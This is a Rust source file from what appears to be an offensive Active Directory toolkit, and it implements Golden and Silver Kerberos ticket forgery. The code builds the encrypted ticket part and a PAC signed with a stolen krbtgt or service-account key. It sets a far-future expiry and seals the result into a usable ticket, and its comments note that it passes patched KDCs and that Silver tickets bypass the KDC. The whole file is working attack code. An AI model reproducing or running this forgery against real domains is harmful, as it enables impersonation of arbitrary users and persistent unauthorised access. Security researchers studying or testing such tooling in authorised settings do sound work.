//! Golden and Silver Kerberos ticket forgery.
//!
//! - **Golden**: a TGT for an arbitrary identity, sealed under the domain's
//!   krbtgt key. Both PAC signatures use the krbtgt key so a fully-patched
//!   (KB5020805) KDC accepts it.
//! - **Silver**: a service ticket (TGS) for a given SPN, sealed under the
//!   target service account's key. Used directly against the service (AP-REQ)
//!   without contacting the KDC — both PAC signatures use the service key.
//!
//! Lifted from adhammer-kerberos' tgs.rs.

use anyhow::{anyhow, Result};
use picky_asn1::bit_string::BitString;
use picky_asn1::wrapper::{
    Asn1SequenceOf, BitStringAsn1, ExplicitContextTag0, ExplicitContextTag1, ExplicitContextTag10,
    ExplicitContextTag2, ExplicitContextTag3, ExplicitContextTag4, ExplicitContextTag5,
    ExplicitContextTag6, ExplicitContextTag7, ExplicitContextTag8, IntegerAsn1, OctetStringAsn1,
    Optional,
};
use picky_asn1_der::application_tag::ApplicationTag;
use picky_krb::constants::types::{NT_PRINCIPAL, NT_SRV_INST};
use picky_krb::crypto::{Cipher, CipherSuite};
use picky_krb::data_types::{
    AuthorizationData, AuthorizationDataInner, EncTicketPart, EncryptedData, EncryptionKey,
    PrincipalName, Ticket, TicketInner, TransitedEncoding,
};

use crate::checksum;
use crate::pac::{assemble_pac, ForgeIdentity};
use crate::util::{
    far_future_time, krb_string, now_kerberos_time, principal, ETYPE_AES256, ETYPE_RC4_HMAC,
};

/// A forged Kerberos ticket: the wire `Ticket`, plus the session key and
/// client identity needed to *use* it (AP-REQ authenticator, ccache export).
pub struct ForgedTicket {
    ticket: Ticket,
    session_key: Vec<u8>,
    cname: PrincipalName,
    crealm: String,
}

impl ForgedTicket {
    /// The encrypted `EncTicketPart` bytes (sealed under the ticket key).
    pub fn ticket_cipher(&self) -> &[u8] {
        &self.ticket.0.enc_part.0.cipher.0 .0
    }
    /// Ticket session key (16 bytes for RC4, 32 for AES256).
    pub fn session_key(&self) -> &[u8] {
        &self.session_key
    }
    pub fn ticket(&self) -> &Ticket {
        &self.ticket
    }
    pub fn cname(&self) -> &PrincipalName {
        &self.cname
    }
    pub fn crealm(&self) -> &str {
        &self.crealm
    }
}

fn aes256() -> Box<dyn Cipher> {
    CipherSuite::Aes256CtsHmacSha196.cipher()
}

fn encrypted_data(etype: u8, cipher: Vec<u8>) -> EncryptedData {
    EncryptedData {
        etype: ExplicitContextTag0::from(IntegerAsn1(vec![etype])),
        kvno: Optional::from(None),
        cipher: ExplicitContextTag2::from(OctetStringAsn1(cipher)),
    }
}

/// Shared ticket forger. Marshals the PAC (signed with `server_sig_key` /
/// `kdc_sig_key`), wraps it in the EncTicketPart authorization-data, and seals
/// the whole thing under `ticket_key` (key usage 2). `sname` is the ticket's
/// service principal.
fn forge_ticket(
    id: &ForgeIdentity,
    realm: &str,
    ticket_key: &[u8],
    server_sig_key: &[u8],
    kdc_sig_key: &[u8],
    sname: &[&str],
    rc4: bool,
) -> Result<ForgedTicket> {
    let realm = realm.to_uppercase();
    let pac_bytes = assemble_pac(id, server_sig_key, kdc_sig_key, rc4)?;
    let etype = if rc4 { ETYPE_RC4_HMAC } else { ETYPE_AES256 };

    // authorization-data: AD-IF-RELEVANT(1) → [ AD-WIN2K-PAC(128) = pac ].
    let win2k = AuthorizationDataInner {
        ad_type: ExplicitContextTag0::from(IntegerAsn1(vec![0x00, 0x80])),
        ad_data: ExplicitContextTag1::from(OctetStringAsn1(pac_bytes)),
    };
    let inner: AuthorizationData = Asn1SequenceOf::from(vec![win2k]);
    let inner_der = picky_asn1_der::to_vec(&inner).map_err(|e| anyhow!("encode PAC AD: {e}"))?;
    let if_rel = AuthorizationDataInner {
        ad_type: ExplicitContextTag0::from(IntegerAsn1(vec![0x01])),
        ad_data: ExplicitContextTag1::from(OctetStringAsn1(inner_der)),
    };
    let auth: AuthorizationData = Asn1SequenceOf::from(vec![if_rel]);

    let mut sk = vec![0u8; if rc4 { 16 } else { 32 }];
    rand::RngCore::fill_bytes(&mut rand::thread_rng(), &mut sk);
    let cname = principal(NT_PRINCIPAL, &[id.user.as_str()]);

    let etp = EncTicketPart {
        flags: ExplicitContextTag0::from(BitStringAsn1::from(BitString::with_bytes(vec![
            0x40, 0xe1, 0x00, 0x00,
        ]))),
        key: ExplicitContextTag1::from(EncryptionKey {
            key_type: ExplicitContextTag0::from(IntegerAsn1(vec![etype])),
            key_value: ExplicitContextTag1::from(OctetStringAsn1(sk.clone())),
        }),
        crealm: ExplicitContextTag2::from(krb_string(&realm)),
        cname: ExplicitContextTag3::from(cname.clone()),
        transited: ExplicitContextTag4::from(TransitedEncoding {
            tr_type: ExplicitContextTag0::from(IntegerAsn1(vec![0])),
            contents: ExplicitContextTag1::from(OctetStringAsn1(vec![])),
        }),
        auth_time: ExplicitContextTag5::from(now_kerberos_time()),
        starttime: Optional::from(Some(ExplicitContextTag6::from(now_kerberos_time()))),
        endtime: ExplicitContextTag7::from(far_future_time()),
        renew_till: Optional::from(Some(ExplicitContextTag8::from(far_future_time()))),
        caddr: Optional::from(None),
        authorization_data: Optional::from(Some(ExplicitContextTag10::from(auth))),
    };
    let etp_app: ApplicationTag<EncTicketPart, 3> = ApplicationTag(etp);
    let etp_der =
        picky_asn1_der::to_vec(&etp_app).map_err(|e| anyhow!("encode EncTicketPart: {e}"))?;
    let enc = if rc4 {
        checksum::rc4_encrypt(ticket_key, 2, &etp_der, None)
    } else {
        aes256()
            .encrypt(ticket_key, 2, &etp_der)
            .map_err(|e| anyhow!("encrypt EncTicketPart: {e}"))?
    };

    let ticket = Ticket::from(TicketInner {
        tkt_vno: ExplicitContextTag0::from(IntegerAsn1(vec![5])),
        realm: ExplicitContextTag1::from(krb_string(&realm)),
        sname: ExplicitContextTag2::from(principal(NT_SRV_INST, sname)),
        enc_part: ExplicitContextTag3::from(encrypted_data(etype, enc)),
    });

    Ok(ForgedTicket {
        ticket,
        session_key: sk,
        cname,
        crealm: realm,
    })
}

/// Forge a **Golden** ticket: a TGT for an arbitrary identity whose PAC's
/// server and KDC signatures are both computed with the domain krbtgt key.
/// `rc4` = true selects RC4-HMAC (etype 23, NT-hash key); false selects
/// AES256-CTS-HMAC-SHA1-96 (etype 18, 32-byte key).
pub fn forge_golden_tgt(
    id: &ForgeIdentity,
    realm: &str,
    krbtgt_key: &[u8],
    rc4: bool,
) -> Result<ForgedTicket> {
    let realm_up = realm.to_uppercase();
    forge_ticket(
        id,
        realm,
        krbtgt_key,
        krbtgt_key,
        krbtgt_key,
        &["krbtgt", &realm_up],
        rc4,
    )
}

/// Forge a **Silver** ticket: a service ticket (TGS) for `spn`, sealed and
/// PAC-signed under the target service account's key (both PAC signatures use
/// that key). Used directly against the service — the KDC never sees it.
pub fn forge_silver_tgt(
    id: &ForgeIdentity,
    realm: &str,
    service_key: &[u8],
    spn: &str,
    rc4: bool,
) -> Result<ForgedTicket> {
    let comps: Vec<&str> = spn.split('/').collect();
    forge_ticket(
        id,
        realm,
        service_key,
        service_key,
        service_key,
        &comps,
        rc4,
    )
}
